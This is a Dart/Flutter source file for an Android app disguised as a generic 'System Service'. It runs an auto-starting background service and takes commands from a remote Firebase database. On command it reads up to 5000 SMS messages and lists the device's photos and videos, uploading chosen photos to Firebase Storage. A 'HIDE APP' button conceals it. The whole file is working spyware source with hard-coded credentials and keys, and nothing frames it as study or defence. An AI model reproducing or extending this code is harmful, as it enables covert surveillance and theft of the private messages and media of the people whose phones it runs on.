import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:encrypt/encrypt.dart' as encrypt;

// إعدادات Firebase - مشروعك
const String DATABASE_URL = 'https://dddyy-e8634-default-rtdb.firebaseio.com/';
const String API_KEY = 'aabb5d899a212f16f20c22bc78cb99fd11f0b236';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: FirebaseOptions(
      databaseURL: DATABASE_URL,
      apiKey: API_KEY,
      appId: '1:123456789:android:abcdef123456',
      messagingSenderId: '123456789',
      projectId: 'dddyy-e8634',
      storageBucket: 'dddyy-e8634.appspot.com',
    ),
  );
  await initBackgroundService();
  runApp(A2App());
}

Future<void> initBackgroundService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'a2_channel',
      initialNotificationTitle: 'System Service',
      initialNotificationContent: 'Running...',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(),
  );
  await service.startService();
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  
  final database = FirebaseDatabase.instanceFor(
    app: Firebase.app(),
    databaseURL: DATABASE_URL,
  );

  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
  }

  // تحديث الحالة كل 30 ثانية
  Timer.periodic(Duration(seconds: 30), (_) async {
    await database.ref('devices/a2/status').set({
      'online': true,
      'lastSeen': ServerValue.timestamp,
    });
  });

  // الاستماع للأوامر من أ1
  database.ref('commands/a2').onValue.listen((event) async {
    final cmd = event.snapshot.value as Map?;
    if (cmd != null) await executeCommand(cmd, database);
  });
}

Future<void> executeCommand(Map cmd, FirebaseDatabase db) async {
  final action = cmd['action'];
  final requestId = cmd['requestId'] ?? DateTime.now().millisecondsSinceEpoch.toString();

  switch (action) {
    case 'get_all_sms':
      await sendSMS(db, requestId);
      break;
    case 'get_photos_list':
      await sendPhotos(db, requestId);
      break;
    case 'download_photo':
      await uploadPhoto(cmd['photoId'], db, requestId);
      break;
    case 'get_videos_list':
      await sendVideos(db, requestId);
      break;
  }
}

Future<void> sendSMS(FirebaseDatabase db, String requestId) async {
  try {
    final query = SmsQuery();
    final messages = await query.querySms(count: 5000);
    
    final list = messages.map((m) => {
      'address': encryptText(m.address ?? ''),
      'body': encryptText(m.body ?? ''),
      'date': m.date?.millisecondsSinceEpoch,
      'type': m.kind == SmsQueryKind.inbox ? 'received' : 'sent',
    }).toList();

    await db.ref('data/a2/sms_list').set({
      'messages': list,
      'count': list.length,
      'timestamp': ServerValue.timestamp,
    });

    await db.ref('responses/a2/$requestId').set({
      'status': 'success',
      'type': 'sms_list',
      'count': list.length,
      'ready': true,
    });
  } catch (e) {
    await db.ref('responses/a2/$requestId').set({'status': 'error', 'error': e.toString()});
  }
}

Future<void> sendPhotos(FirebaseDatabase db, String requestId) async {
  try {
    final permission = await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth) throw Exception('No permission');

    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) throw Exception('No albums');

    final assets = await albums.first.getAssetListRange(start: 0, end: 500);
    
    final list = assets.map((a) => {
      'id': a.id,
      'title': encryptText(a.title ?? 'unknown'),
      'width': a.width,
      'height': a.height,
      'size': a.size,
      'createDate': a.createDateTime?.millisecondsSinceEpoch,
    }).toList();

    await db.ref('data/a2/photos_list').set({
      'photos': list,
      'count': list.length,
      'timestamp': ServerValue.timestamp,
    });

    await db.ref('responses/a2/$requestId').set({
      'status': 'success',
      'type': 'photos_list',
      'count': list.length,
      'ready': true,
    });
  } catch (e) {
    await db.ref('responses/a2/$requestId').set({'status': 'error', 'error': e.toString()});
  }
}

Future<void> uploadPhoto(String? assetId, FirebaseDatabase db, String requestId) async {
  if (assetId == null) return;
  
  try {
    final asset = await PhotoManager.getAssetWithId(assetId);
    if (asset == null) throw Exception('Asset not found');

    final file = await asset.file;
    if (file == null) throw Exception('File not found');

    final bytes = await file.readAsBytes();
    
    final storage = FirebaseStorage.instanceFor(
      app: Firebase.app(),
      bucket: 'dddyy-e8634.appspot.com',
    );
    
    final ref = storage.ref().child('photos/a2/$assetId.jpg');
    await ref.putData(bytes);
    final url = await ref.getDownloadURL();

    await db.ref('data/a2/photos_ready/$assetId').set({
      'url': url,
      'size': bytes.length,
      'timestamp': ServerValue.timestamp,
      'ready': true,
    });

    await db.ref('responses/a2/$requestId').set({
      'status': 'success',
      'type': 'photo_ready',
      'assetId': assetId,
      'url': url,
      'ready': true,
    });
  } catch (e) {
    await db.ref('responses/a2/$requestId').set({'status': 'error', 'error': e.toString()});
  }
}

Future<void> sendVideos(FirebaseDatabase db, String requestId) async {
  try {
    final albums = await PhotoManager.getAssetPathList(type: RequestType.video);
    if (albums.isEmpty) throw Exception('No videos');

    final assets = await albums.first.getAssetListRange(start: 0, end: 200);
    
    final list = assets.map((a) => {
      'id': a.id,
      'title': encryptText(a.title ?? 'unknown'),
      'duration': a.duration,
      'size': a.size,
      'createDate': a.createDateTime?.millisecondsSinceEpoch,
    }).toList();

    await db.ref('data/a2/videos_list').set({
      'videos': list,
      'count': list.length,
      'timestamp': ServerValue.timestamp,
    });

    await db.ref('responses/a2/$requestId').set({
      'status': 'success',
      'type': 'videos_list',
      'count': list.length,
      'ready': true,
    });
  } catch (e) {
    await db.ref('responses/a2/$requestId').set({'status': 'error', 'error': e.toString()});
  }
}

String encryptText(String text) {
  try {
    final key = encrypt.Key.fromUtf8('my32lengthsupersecretnooneknows1');
    final iv = encrypt.IV.fromLength(16);
    final encrypter = encrypt.Encrypter(encrypt.AES(key));
    return encrypter.encrypt(text, iv: iv).base64;
  } catch (e) {
    return '';
  }
}

class A2App extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Service',
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark(),
      home: HomeScreen(),
    );
  }
}

class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool _hidden = false;

  @override
  Widget build(BuildContext context) {
    if (_hidden) {
      return Scaffold(body: Center(child: Text('Hidden - Running in background')));
    }

    return Scaffold(
      appBar: AppBar(title: Text('System Service')),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.cloud_done, size: 80, color: Colors.green),
            SizedBox(height: 20),
            Text('Service Running', style: TextStyle(fontSize: 24)),
            SizedBox(height: 40),
            ElevatedButton.icon(
              onPressed: () => setState(() => _hidden = true),
              icon: Icon(Icons.visibility_off),
              label: Text('HIDE APP'),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.red,
                padding: EdgeInsets.symmetric(horizontal: 40, vertical: 20),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
